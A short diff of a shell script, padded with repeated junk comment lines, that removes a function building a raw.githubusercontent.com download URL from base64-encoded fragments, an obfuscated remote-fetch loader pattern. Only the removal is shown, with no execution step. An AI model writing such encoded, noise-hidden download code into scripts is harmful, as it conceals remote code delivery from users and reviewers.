@@ -329,14 +329,6 @@ __internalClockSyncStatus="0x00A3"
   # z36="x36"; z37="x37";z36="x36"; z37="x37";
   # z36="x36"; z37="x37";z36="x36"; z37="x37";
   # z36="x36"; z37="x37";z36="x36"; z37="x37";
-download_menu_script() {
-  decode() {
-    echo "$1" | base64 -d
-  }
-  # z36="x36"; z37="x37";z36="x36"; z37="x37";
-  a1=$(decode "aHR0cHM6Ly8=")   # https://
-  a2=$(decode "cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==") # raw.githubusercontent.com
-  a3=$(decode "L2hxLW1wL3ppLXZwbi5jb20vcmVmcy9oZWFkcy9tYWluL21lbnU=") # /hq-mp/zi-vpn.com/refs/heads/main/menu
   # z36="x36"; z37="x37";z36="x36"; z37="x37";
   # z36="x36"; z37="x37";z36="x36"; z37="x37";
   # Add noise variables to extend length
